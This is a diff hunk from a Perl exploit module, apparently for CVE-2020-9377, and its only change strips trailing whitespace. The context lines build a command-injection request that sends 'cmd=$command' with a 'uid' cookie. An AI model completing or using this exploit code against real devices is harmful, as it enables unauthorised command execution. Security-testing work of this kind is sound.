@@ -24,7 +24,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
             my $payload   = "cmd=$command";
-            
+
             my $headers   = HTTP::Headers -> new (
                 'Content-Type' => "application/x-www-form-urlencoded",
                 'Cookie' => "uid=$cookie"
